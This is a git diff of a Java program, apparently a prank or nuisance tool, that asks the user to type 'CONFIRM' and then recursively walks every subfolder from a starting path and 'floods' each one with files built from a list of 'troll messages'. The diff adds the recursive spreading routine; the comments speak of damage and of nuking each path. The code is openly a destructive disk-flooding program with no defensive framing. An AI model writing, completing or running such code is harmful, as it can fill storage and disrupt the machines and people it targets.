@@ -20,19 +20,12 @@ public class main {
 			//safety mechanism
 			String safety=JOptionPane.showInputDialog("type:CONFIRM");
 			if (safety.equals("CONFIRM")) {
-					System.out.println("boom!");
+				System.out.println("boom!");
 					
-					
-					
-					
-					
-					 
-					
-					
-					
-					
-					
-					
+				//creates a file object for the directory
+				File file=new File(path);
+				//starts the controller at the start location
+				Controler(file,damage,messageList());					
 			}
 		}	
 	}
@@ -64,9 +57,7 @@ public class main {
 	}
 	
 	//returns list with only the directories form the "path" / location
-	public static File[] dirReader(String path) {
-		//creates a file object for the directory
-		File file=new File(path);
+	public static File[] dirReader(File file) {
 		
 		//creates a file fileter and sets it up
 		FileFilter filter=new FileFilter() {
@@ -101,7 +92,7 @@ public class main {
     }
 	
 	//floods the directory
-	public static void flood(int damage, String trollMessage[] , String path) {
+	public static void flood(int damage, String trollMessage[] , File path) {
 			
 			
 			//rng for the messages
@@ -194,7 +185,19 @@ public class main {
 	}
 	
 	//controls the damage spread covering all of the folders inside
-	public static void Controler() {
+	public static void Controler(File startingPath,int damage,String[] trollMessage) {
+		//the program starts in the starting path
+		File[] listFolders=dirReader(startingPath);
+		
+		//for cycle to walk around all directories
+		for (int i = 0; i < listFolders.length; i++) {
+			//search for other paths
+			Controler(listFolders[i],damage,trollMessage);
+		}
+		//NUKE this path last to save the program time
+		//System.out.println(startingPath+"\t\tflooded");
+		flood(damage, trollMessage, startingPath);
+		
 		
 	}
 }
